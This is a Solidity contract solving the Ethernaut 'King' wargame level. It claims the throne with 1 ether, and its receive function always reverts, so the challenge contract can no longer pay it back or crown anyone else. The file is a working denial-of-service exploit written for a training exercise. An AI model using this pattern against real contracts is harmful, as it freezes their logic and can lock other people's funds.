// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/*
    https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5
    https://cmichel.io/ethernaut-solutions/
 */
contract BecomeKing {

    address payable challenge = 0xE9C0A428D857E5f3502609f2901b0b573C6816E4;

    function attack() external payable {
        require(msg.value == 1 ether, "please send exactly 1 ether");
        // claim throne
        // use call here instead of challenge.transfer because transfer
        // has a gas limit and runs out of gas
        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
        require(success, "External call failed");
    }

    receive() external payable {
        require(false, "cannot claim my throne!");
    }

}